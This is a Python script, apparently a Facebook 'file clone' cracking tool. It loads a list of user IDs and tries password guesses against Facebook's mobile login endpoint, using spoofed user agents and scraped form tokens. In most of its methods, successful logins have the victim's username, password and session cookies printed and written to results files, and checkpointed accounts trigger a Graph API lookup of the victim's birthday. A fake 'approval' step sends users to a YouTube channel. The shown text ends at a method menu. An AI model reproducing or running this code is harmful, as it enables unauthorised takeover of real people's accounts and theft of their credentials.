import os
try:
    import requests
except ImportError:
    print('\n [×] Modul requests belum terinstall!...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [×] Modul Futures belum terinstall!...\n')
    os.system('pip install futures')

try:
    import bs4
except ImportError:
    print('\n [×] Modul Bs4 belum terinstall!...\n')
    os.system('pip install bs4')

import requests, os, re, bs4, sys, json, time, random, datetime, subprocess
from concurrent.futures import ThreadPoolExecutor as YayanGanteng
from datetime import datetime
from bs4 import BeautifulSoup
ct = datetime.now()
n = ct.month
bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
waktu = '%s %s %s'%(ha,op,ta)
waktu.split('/')
### WARNA RANDOM ###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
############################ RESPONSE FACEBOOK ###########################################
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,pwBaru=[],[]
Apk = []
ok = []
cp = []
id = []
user = []
loop = 0
url_lookup = "https://lookup-id.com/"
url1 = "https://mbasic.facebook.com/"
url2 = "mbasic.facebook.com"
ua = "NokiaC2-00/2.0 (03.45) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; kau; nokiac2-00) UCBrowser8.3.0.154/70/352/UCWEB Mobile"
url_mb = "https://mbasic.facebook.com"
url_ip = "https://www.httpbin.org/ip"
url_graph = "https://graph.facebook.com/{}"
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
hhhh, iiii, jjjj, kkkk = "index.php?", "next=https%3A%2F%2Fdevelopers.facebook.com", "%2Ftools%2Fdebug", "%2Faccesstoken%2F"
dddd, eeee, ffff, gggg = "login", "device-based", "validate-password", "?shbl=0"
aaaa, bbbb, cccc = "tools", "debug", "accesstoken"
bahasa = "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
uas_bawaan = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
uas_nokiac2 = "NokiaC2-00/2.0 (03.45) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; kau; nokiac2-00) UCBrowser8.3.0.154/70/352/UCWEB Mobile"
uas_nokiax20 = "Mozilla/5.0 (Linux; Android 12; Nokia X20 Build/SKQ1.210821.001; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36"
uas_nokiax = "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)"
uas_samsungse = "Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"
uas_redmi9a = "Mozilla/5.0 (Linux; U; Android 10; id-id; Redmi 9A Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36"
uas_nokiaxl = "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_XL Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.12"
uas_tes = "Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4X Build/MiUI MS; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 38.0.0.13.95 Android (24/7.0; 480dpi; 1080x1920; Xiaomi/xiaomi; Redmi Note 4X; mido; qcom; ru_RU; 99640911)"
uas_random = random.choice(["Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"])
uas_nokiac3 = "NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"
uas_iphone = "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBCR/]"
uas_nokia5plus = "Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36"
uas_random2 = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36"])
ugen2=[]
ugen=[]


for xd in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='Nokia'
    e=random.randrange(100, 9999)
    f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Mobile Safari/535.1'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku)


    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
     
logo = """\x1b[1;92md8b   db  .d8b.  .88b  d88. d88888b 
888o  88 d8' `8b 88'YbdP`88 88'     
88V8o 88 88ooo88 88  88  88 88ooooo 
88 V8o88 88~~~88 88  88  88 88~~~~~ 
88  V888 88   88 88  88  88 88.     
VP   V8P YP   YP YP  YP  YP Y88888P 
\x1b[1;97m--------------------------------------
\x1b[1;97m[+] Author  :  Not Filled        
\x1b[1;97m[+] facebook:  Not Filled
\x1b[1;97m[+] Github  :  Not Filled
\x1b[1;97m[+] Version :\x1b[1;97m  Not Filled    \x1b[1;97m               
\x1b[1;97m--------------------------------------
  """
class Main:
	def __init__(self):
		self.id = []
		self.ok = []
		self.cp = []
		self.loop = 0
		os.system("clear")
		print(logo)
		print("")
		print("- - - - - - - - - - - - - - - - - - - - - - - - - - - - - -")
		print("\033[1;37m𝗡𝗢𝗧𝗘 : Approval ke liye channel subscribe kre")
		print("- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - ")
		
		
		print("")
		print("\033[1;37m [1] 𝗙𝗶𝗿𝘀𝘁 Subscribe YouTube channel   ")
		print("\033[1;37m [2] 𝗘𝘅𝗶𝘁")
		print("")
		Baloch = input("\n\033[1;37m  Choose : \033[1;32m")
		if Baloch in ["", " "]:
			exit()
		elif Baloch in ["2", "02"]:
			print("    Thanks♥️")
			exit() 
		elif Baloch in ["1", "01"]:
			os.system("xdg-open https://youtube.com/c/Technicalboss07 ")
			print("")
			time.sleep(3.0)
			print("\033[1;37m    𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 𝗔𝗣𝗣𝗥𝗢𝗩𝗔𝗟 ")
			print("")
			input("\n\033[1;37m TYᑭᗴ Tᕼᗴ Oᗯᑎᗴᖇ ᖴᗩᑕᗴᗷOOK ᗩᑕᑕOᑌᑎT ᑎᗩᗰᗴ \033[1;37m")
			time.sleep(3.1)
			print("")
			print("\033[1;32m ᗯᗴᒪᑕOᗰᗴ TO ••𝗠𝗔𝗝𝗜𝗗•• ᗷᖇᗩᑎᗪ TOOᒪՏ")
			time.sleep(3.0)
os.system ("clear")
def file():
	        
            print(logo)
            print("---------------------------------------------")
            print("\033[1;97m [1] File Clone ")
            print(" [0] Exit")
            print("---------------------------------------------")
            
            key = input("\n [+] Input : ")
            if key in [""]:
                print(" [!] please select correct option")
                exit()
            elif key in ["1", "01"]:
                __chigoue__().chi(id)

class __chigoue__:
    def __init__(self):
        self.id = []
    def chi(self, id):
        os.system("clear")
        print(logo)
        crot = ('t')
        if crot in[""]:
            print(f" {N}[{M}×{N}] Don't be empty");__chigoue__().chi(id)
        elif crot in["Y","y"]:
            Apk.append("y")
        elif crot in["T","t"]:
            Apk.append("t")
        else:
            print(f" {H}[{H}×{H}] Select Between y/t");__chigoue__().chi(id)
        self.cnt = input('\033[1;92m (•) Put File Path :\033[1;92m ')
        self.id = open(self.cnt).read().splitlines()
        os.system('clear')
        ___two___ = ('y')
        if ___two___ in ('yes', 'Yes', 'Y', 'y'):
            self.__pler__()
        else:
            print(' [!] Choose Correct One')
            self.chi(id)
    def __metode__(self, cebok, user, pasw):
        global ok,cp,loop
        animasi = random.choice(["\x1b[1;92m[NAME]","\x1b[1;91m[NAME]","\x1b[1;93m[NAME]","\x1b[1;94m[NAME]","\x1b[1;95m[NAME]","\x1b[1;96m[NAME]","\x1b[1;97m[NAME]"])
        sys.stdout.write(f"\r{O}{animasi} {BP}{loop}{N}|{BM}{len(self.id)}{N}][{H}OK:{len(ok)}{B}][{H}{'{:.1%}'.format(loop/float(len(self.id)))}{N}]")
        sys.stdout.flush()
        try:
            for pw in pasw:
                pw = pw.lower()
                session=requests.Session()
                dat = {}
                url = session.get(f"https://free.facebook.com/login/device-based/password/?uid={user}&flow=login_no_pin")
                das = {
                "Host": "free.facebook.com",
                "connection":"keep-alive",
                "cache-control": "max-age=0",
                "save-data": "on",
                "origin": "https://free.facebook.com",
                "content-type": "text/html; charset=utf-8",
                "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9, image/avif, image/webp, image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "Pragma":"no-cache",
                "x-requested-with": "mark.via.gp",
                "dnt": "1",
                "sec-ch-ua":"' Not A; Brand'; v= '99', 'Chromium';v='101'",
                "sec-ch-ua-platform": "'Android'",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "navigate",
                "sec-fetch-user": "?1",
                "sec-fetch-dest": "document",
                "Upgrade-Insecure-Requests":"1",
                "User-Agent":"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+",
                "referer": "https://free.facebook.com/login/device-based/password/?uid="+user+"&flow=login_no_pin",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,id;q=0.6,bs;q=0.5"
                }
                dat = {"lsd": re.search('name="lsd" value="(.*?)"', str(url.text)).group(1),"jazoest": re.search('name="jazoest" value="(.*?)"', str(url.text)).group(1),"uid": user,"flow":"login_no_pin","pass": pw,"flow": "login_no_pin","next": "https://m.facebook.com/login/device-based/password/?uid={user}&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr"}
                xx = session.post("https://free.facebook.com/login/device-based/validate-password/?shbl=0", data=dat, headers=das)
                
                
                if "c_user" in session.cookies.get_dict():
                    cooz = session.cookies.get_dict()
                    coki = 'datr=' + cooz['datr'] + ';' + ('c_user=' + cooz['c_user']) + ';' + ('fr=' + cooz['fr']) + ';' + ('xs=' + cooz['xs'])
                    if "t" in Apk:
                        print('\r %s[NAME-OK] %s | %s%s'%(H,user,pw,N))
                        print(f'\r {H}[Cookie] : {coki}\n')
                    elif "y" in Apk:
                        print('\r %s[NAME-OK] %s               \n %s | %s%s'%(H,waktu,user,pw,N))
                        print(f'\r {H}[Cookie]   : {coki}\n')
                    wrt = '[NAME-OK] %s • %s' % (user,pw)
                    ok.append(wrt)
                    cek_apk(session,coki)
                    open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                if "datr=" in session.cookies.get_dict():
                   print(user,pw)
                   break
                elif 'checkpoint' in session.cookies.get_dict():
                    try:
                        tokenz = open('.token.txt').read()
                        cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                        month, day, year = cp_ttl.split('/')
                        month = bulan_ttl[month]
 #                       print('\r %s [NAME-CP] %s | %s\n Password : %s\n Tanggal Lahir : %s %s %s%s\n'%(K,waktu,user,pw,day,month,year,N))
                        wrt = '[NAME-CP] %s • %s • %s %s %s' % (user,pw,day,month,year)
                        cp.append(wrt)
                        open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                        break
                    except (KeyError, IOError):
                        month = ''
                        day   = ''
                        year  = ''
                    except:pass
#                    print('\r%s[NAME-CP] %s / %s'%(M,user,pw))
                    wrt = '[NAME-CP] %s • %s' % (user,pw)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                else:
                    continue
                #time.sleep(31)
            loop+=1
        except requests.exceptions.ConnectionError:
             self.__metode__(cebok, user, pasw)

    def __metode1__(self, cebok, user, pasw):
        global ok,cp,loop
        animasi = random.choice(["\x1b[1;92m[BXB1]","\x1b[1;92m[BXB1]","\x1b[1;92m[BXB1]","\x1b[1;92m[BXB1]","\x1b[1;92m[BXB1]","\x1b[1;92m[BXB1]","\x1b[1;92m[BXB1]"])
        sys.stdout.write(f"\r{N}{animasi} {N}{loop}{N}|{N}{len(self.id)} {N}[{H}OK:1{N}][{K}CP:{len(cp)}{N}] [{H}{'{:.1%}'.format(loop/float(len(self.id)))}{N}]")
        sys.stdout.flush()
        try:
            for pw in pasw:
                pw = pw.lower()
                session=requests.Session()
                session=requests.Session()
                dat = {}
                url = session.get(f"https://free.facebook.com/login/device-based/password/?uid={user}&flow=login_no_pin")
                das = {
                "Host": "free.facebook.com",
                "connection":"keep-alive",
                "cache-control": "max-age=0",
                "save-data": "on",
                "origin": "https://free.facebook.com",
                "content-type": "text/html; charset=utf-8",
                "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9, image/avif, image/webp, image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "Pragma":"no-cache",
                "x-requested-with": "mark.via.gp",
                "dnt": "1",
                "sec-ch-ua":"' Not A; Brand'; v= '99', 'Chromium';v='101'",
                "sec-ch-ua-platform": "'Android'",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "navigate",
                "sec-fetch-user": "?1",
                "sec-fetch-dest": "document",
                "Upgrade-Insecure-Requests":"1",
                "User-Agent":"Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5",
                "referer": "https://free.facebook.com/login/device-based/password/?uid="+user+"&flow=login_no_pin",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,id;q=0.6,bs;q=0.5"
                }
                dat = {"lsd": re.search('name="lsd" value="(.*?)"', str(url.text)).group(1),"jazoest": re.search('name="jazoest" value="(.*?)"', str(url.text)).group(1),"uid": user,"flow":"login_no_pin","pass": pw,"flow": "login_no_pin","next": "https://m.facebook.com/login/device-based/password/?uid={user}&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr"}
                xx = session.post("https://free.facebook.com/login/device-based/validate-password/?shbl=0", data=dat, headers=das)
                
                if "c_user" in session.cookies.get_dict():
                    cooz = session.cookies.get_dict()
                    coki = 'datr=' + cooz['datr'] + ';' + ('c_user=' + cooz['c_user']) + ';' + ('fr=' + cooz['fr']) + ';' + ('xs=' + cooz['xs'])
                    if "t" in Apk:
                        print('\r %s[BXB-OK] %s               \n Username : %s\n Password : %s%s'%(H,waktu,user,pw,N))
                        print(f'\r {H}Cookie   : {coki}\n')
                    elif "y" in Apk:
                        print(f'\r %s[BXB-OK] %s               \n Username : %s\n Password : %s%s'%(H,waktu,user,pw,N))
                        print(f'\r {H}Cookie   : {coki}')
                    wrt = '[BXB-OK] %s • %s' % (user,pw)
                    ok.append(wrt)
                    cek_apk(session,coki)
                    open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                    try:
                        tokenz = open('.token.txt').read()
                        cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                        month, day, year = cp_ttl.split('/')
                        month = bulan_ttl[month]
                        print('\r %sCP %s               \n Username : %s\n Password : %s\n Tanggal Lahir : %s %s %s%s\n'%(K,waktu,user,pw,day,month,year,N))
                        wrt = '[BXB-CP] %s • %s • %s %s %s' % (user,pw,day,month,year)
                        cp.append(wrt)
                        open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                        break
                    except (KeyError, IOError):
                        month = ''
                        day   = ''
                        year  = ''
                    except:pass
                    print('\r %s[BXB-CP] %s %s %s%s\n'%(K,user,pw,N))
                    wrt = '[BXB-CP] %s • %s' % (user,pw)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                else:
                    continue
                #time.sleep(31)
            loop+=1
        except requests.exceptions.ConnectionError:
             self.__metode1__(cebok, user, pasw)
             
             


    def __metode2__(self, cebok, user, pasw):
        global ok,cp,loop
        animasi = random.choice(["\x1b[1;92m[BXB]","\x1b[1;92m[BXB]","\x1b[1;92m[BXB]","\x1b[1;92m[BXB]","\x1b[1;92m[BXB]","\x1b[1;92m[BXB]","\x1b[1;92m[BXB]"])
        sys.stdout.write(f"\r{N}{animasi} {N}{loop}{N}|{N}{len(self.id)} {N}[{H}OK:{len(ok)}{N}][{K}CP:{len(cp)}{N}] [{H}{'{:.1%}'.format(loop/float(len(self.id)))}{N}]")
        sys.stdout.flush()
        try:
            for pw in pasw:
                pw = pw.lower()
                session=requests.Session()
                session=requests.Session()
                dat = {}
                url = session.get(f"https://free.facebook.com/login/device-based/password/?uid={user}&flow=login_no_pin")
                das = {
                "Host": "free.facebook.com",
                "connection":"keep-alive",
                "cache-control": "max-age=0",
                "save-data": "on",
                "origin": "https://free.facebook.com",
                "content-type": "text/html; charset=utf-8",
                "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9, image/avif, image/webp, image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "Pragma":"no-cache",
                "x-requested-with": "mark.via.gp",
                "dnt": "1",
                "sec-ch-ua":"' Not A; Brand'; v= '99', 'Chromium';v='101'",
                "sec-ch-ua-platform": "'Android'",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "navigate",
                "sec-fetch-user": "?1",
                "sec-fetch-dest": "document",
                "Upgrade-Insecure-Requests":"1",
                "User-Agent":"Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5",
                "referer": "https://free.facebook.com/login/device-based/password/?uid="+user+"&flow=login_no_pin",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,id;q=0.6,bs;q=0.5"
                }
                dat = {"lsd": re.search('name="lsd" value="(.*?)"', str(url.text)).group(1),"jazoest": re.search('name="jazoest" value="(.*?)"', str(url.text)).group(1),"uid": user,"flow":"login_no_pin","pass": pw,"flow": "login_no_pin","next": "https://m.facebook.com/login/device-based/password/?uid={user}&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr"}
                xx = session.post("https://free.facebook.com/login/device-based/validate-password/?shbl=0", data=dat, headers=das)
                
                if "c_user" in session.cookies.get_dict():
                    cooz = session.cookies.get_dict()
                    coki = 'datr=' + cooz['datr'] + ';' + ('c_user=' + cooz['c_user']) + ';' + ('fr=' + cooz['fr']) + ';' + ('xs=' + cooz['xs'])
                    if "t" in Apk:
                        print('\r %s[BXB-OK] %s               \n Username : %s\n Password : %s%s'%(H,waktu,user,pw,N))
                        print(f'\r {H}Cookie   : {coki}\n')
                    elif "y" in Apk:
                        print(f'\r %s[BXB-OK] %s               \n Username : %s\n Password : %s%s'%(H,waktu,user,pw,N))
                        print(f'\r {H}Cookie   : {coki}')
                    wrt = '[BXB-OK] %s • %s' % (user,pw)
                    ok.append(wrt)
                    cek_apk(session,coki)
                    open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                    try:
                        tokenz = open('.token.txt').read()
                        cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                        month, day, year = cp_ttl.split('/')
                        month = bulan_ttl[month]
                        print('\r %sCP %s               \n Username : %s\n Password : %s\n Tanggal Lahir : %s %s %s%s\n'%(K,waktu,user,pw,day,month,year,N))
                        wrt = '[BXB-CP] %s • %s • %s %s %s' % (user,pw,day,month,year)
                        cp.append(wrt)
                        open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                        break
                    except (KeyError, IOError):
                        month = ''
                        day   = ''
                        year  = ''
                    except:pass
                    print('\r %s[BXB-CP] %s %s %s%s\n'%(K,user,pw,N))
                    wrt = '[BXB-CP] %s • %s' % (user,pw)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                else:
                    continue
                #time.sleep(31)
            loop+=1
        except requests.exceptions.ConnectionError:
             self.__metode2__(cebok, user, pasw)



    def __pler__(self):
        os.system('clear')
        print(logo)
        print("---------------------------------------------")
        print ('[1] Method  {Try}')
        print ('[2] Method ')
        print ('[3] Method ')
        print("---------------------------------------------")
        yan = input('\x1b[1;97m\n[+] Put Method : ')
